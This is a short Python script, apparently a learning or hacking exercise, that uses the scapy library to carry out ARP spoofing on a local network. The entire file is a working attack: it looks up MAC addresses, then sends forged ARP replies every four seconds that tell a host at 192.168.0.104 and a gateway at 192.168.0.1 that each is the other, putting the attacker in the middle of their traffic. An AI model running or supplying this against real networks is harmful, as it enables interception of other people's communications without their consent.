#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answererd_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return (answererd_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet)

if __name__ == "__main__":
    while True:
        spoof("192.168.0.104","192.168.0.1")
        spoof("192.168.0.1","192.168.0.104")
        time.sleep(4)
